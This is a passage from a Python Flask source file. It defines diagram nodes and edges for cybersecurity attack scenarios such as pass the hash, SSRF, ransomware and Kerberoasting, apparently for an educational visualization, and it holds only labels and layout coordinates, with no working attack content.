        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'monitor','label':'Monitor Mode','type':'malicious','x':220,'y':100},
        {'id':'ap','label':'Target AP','type':'router','x':400,'y':100},
        {'id':'client','label':'WiFi Client','type':'workstation','x':400,'y':300},
        {'id':'handshake','label':'4-Way Handshake','type':'database','x':220,'y':300},
        {'id':'cracked','label':'Cracked Key','type':'server','x':600,'y':200}],
        'edges': [{'from':'attacker','to':'monitor'},{'from':'monitor','to':'ap'},{'from':'ap','to':'client'},
                  {'from':'client','to':'handshake'},{'from':'handshake','to':'cracked'}]}
    # Scenario 20: Pass the Hash
    maps[20] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'ws','label':'Workstation','type':'workstation','x':230,'y':200},
        {'id':'mimikatz','label':'Mimikatz','type':'malicious','x':230,'y':350},
        {'id':'dc','label':'Domain Controller','type':'server','x':450,'y':130},
        {'id':'fs','label':'File Server','type':'server','x':450,'y':280},
        {'id':'golden','label':'Golden Ticket','type':'malicious','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'ws'},{'from':'ws','to':'mimikatz'},{'from':'mimikatz','to':'dc'},
                  {'from':'mimikatz','to':'fs'},{'from':'dc','to':'golden'}]}
    # Scenario 21: Botnets
    maps[21] = {'nodes': [
        {'id':'c2','label':'C2 Server','type':'attacker','x':350,'y':50},
        {'id':'b1','label':'Bot 1','type':'malicious','x':100,'y':200},
        {'id':'b2','label':'Bot 2','type':'malicious','x':250,'y':200},
        {'id':'b3','label':'Bot 3','type':'malicious','x':400,'y':200},
        {'id':'b4','label':'Bot 4','type':'malicious','x':550,'y':200},
        {'id':'target','label':'DDoS Target','type':'server','x':350,'y':350}],
        'edges': [{'from':'c2','to':'b1'},{'from':'c2','to':'b2'},{'from':'c2','to':'b3'},{'from':'c2','to':'b4'},
                  {'from':'b1','to':'target'},{'from':'b2','to':'target'},{'from':'b3','to':'target'},{'from':'b4','to':'target'}]}
    # Scenario 22: DLL Injection
    maps[22] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'payload','label':'Malicious DLL','type':'malicious','x':250,'y':120},
        {'id':'process','label':'svchost.exe','type':'server','x':450,'y':200},
        {'id':'inject','label':'DLL Injection','type':'malicious','x':250,'y':300},
        {'id':'system','label':'SYSTEM Shell','type':'server','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'payload'},{'from':'payload','to':'inject'},{'from':'inject','to':'process'},
                  {'from':'process','to':'system'}]}
    # Scenario 23: SSRF
    maps[23] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'webapp','label':'Web App','type':'server','x':250,'y':200},
        {'id':'meta','label':'AWS Metadata','type':'cloud','x':450,'y':100},
        {'id':'internal','label':'Internal Service','type':'server','x':450,'y':300},
        {'id':'s3','label':'S3 Bucket','type':'database','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'webapp'},{'from':'webapp','to':'meta'},{'from':'webapp','to':'internal'},
                  {'from':'meta','to':'s3'}]}
    # Scenario 24: Ransomware
    maps[24] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'rdp','label':'RDP Server','type':'server','x':230,'y':200},
        {'id':'exfil','label':'Exfil Server','type':'malicious','x':230,'y':350},
        {'id':'share1','label':'File Share 1','type':'server','x':450,'y':100},
        {'id':'share2','label':'File Share 2','type':'server','x':450,'y':300},
        {'id':'ransomware','label':'Ransom Note','type':'malicious','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'rdp'},{'from':'rdp','to':'share1'},{'from':'rdp','to':'share2'},
                  {'from':'share1','to':'exfil'},{'from':'share2','to':'ransomware'}]}
    # Scenario 25: Kerberoasting
    maps[25] = {'nodes': [
        {'id':'attacker','label':'Low-Priv User','type':'attacker','x':50,'y':200},
        {'id':'ad','label':'Active Directory','type':'server','x':250,'y':100},
        {'id':'spn','label':'SPN Accounts','type':'database','x':250,'y':300},
        {'id':'tgs','label':'TGS Tickets','type':'malicious','x':450,'y':200},
        {'id':'dc','label':'Domain Controller','type':'server','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'ad'},{'from':'ad','to':'spn'},{'from':'spn','to':'tgs'},
                  {'from':'tgs','to':'dc'}]}
    # Scenario 26: Device Cloning
    maps[26] = {'nodes': [
        {'id':'attacker','label':'Forensic Station','type':'attacker','x':50,'y':200},
        {'id':'device','label':'Target Device','type':'workstation','x':250,'y':200},
        {'id':'clone','label':'Disk Image','type':'database','x':450,'y':100},
        {'id':'creds','label':'Credentials','type':'malicious','x':450,'y':300},
        {'id':'recovered','label':'Recovered Files','type':'server','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'device'},{'from':'device','to':'clone'},{'from':'clone','to':'creds'},
                  {'from':'clone','to':'recovered'}]}
    # Scenario 27: Watering Hole
    maps[27] = {'nodes': [
        {'id':'attacker','label':'APT Group','type':'attacker','x':50,'y':200},
        {'id':'website','label':'Industry News','type':'server','x':250,'y':200},
        {'id':'exploit','label':'Exploit Kit','type':'malicious','x':250,'y':350},
        {'id':'v1','label':'Target Emp 1','type':'workstation','x':450,'y':100},
        {'id':'v2','label':'Target Emp 2','type':'workstation','x':450,'y':300},
        {'id':'c2','label':'C2 Server','type':'malicious','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'website'},{'from':'website','to':'exploit'},{'from':'exploit','to':'v1'},
                  {'from':'exploit','to':'v2'},{'from':'v1','to':'c2'},{'from':'v2','to':'c2'}]}
    # Scenario 28: Insider Attack
    maps[28] = {'nodes': [
        {'id':'insider','label':'Insider','type':'attacker','x':50,'y':200},
        {'id':'db','label':'Customer DB','type':'database','x':250,'y':200},
        {'id':'stego','label':'Steganography','type':'malicious','x':450,'y':120},
        {'id':'email','label':'Personal Email','type':'server','x':450,'y':300},
        {'id':'darkweb','label':'Dark Web','type':'malicious','x':650,'y':200}],
        'edges': [{'from':'insider','to':'db'},{'from':'db','to':'stego'},{'from':'stego','to':'email'},
                  {'from':'email','to':'darkweb'}]}
    # Scenario 29: Zero-Day
    maps[29] = {'nodes': [
        {'id':'attacker','label':'Researcher','type':'attacker','x':50,'y':200},
        {'id':'fuzz','label':'AFL Fuzzer','type':'malicious','x':220,'y':100},
        {'id':'target','label':'Target App','type':'server','x':400,'y':100},
        {'id':'exploit','label':'ROP Exploit','type':'malicious','x':220,'y':300},
        {'id':'payload','label':'Payload','type':'malicious','x':400,'y':300},
        {'id':'shell','label':'Root Shell','type':'server','x':600,'y':200}],
        'edges': [{'from':'attacker','to':'fuzz'},{'from':'fuzz','to':'target'},{'from':'target','to':'exploit'},
                  {'from':'exploit','to':'payload'},{'from':'payload','to':'shell'}]}
    # Scenario 30: Living Off the Land
    maps[30] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'certutil','label':'certutil.exe','type':'server','x':220,'y':100},
        {'id':'wmic','label':'WMIC','type':'server','x':220,'y':300},
        {'id':'schtasks','label':'schtasks','type':'malicious','x':420,'y':100},
        {'id':'psexec','label':'PsExec','type':'malicious','x':420,'y':300},
        {'id':'dns','label':'DNS Exfil','type':'cloud','x':620,'y':200}],
        'edges': [{'from':'attacker','to':'certutil'},{'from':'attacker','to':'wmic'},{'from':'certutil','to':'schtasks'},
                  {'from':'wmic','to':'psexec'},{'from':'psexec','to':'dns'},{'from':'schtasks','to':'dns'}]}
    return jsonify(maps.get(scenario_id, maps[1]))

if __name__ == '__main__':
    init_db()
    app.run(debug=True, port=5000)

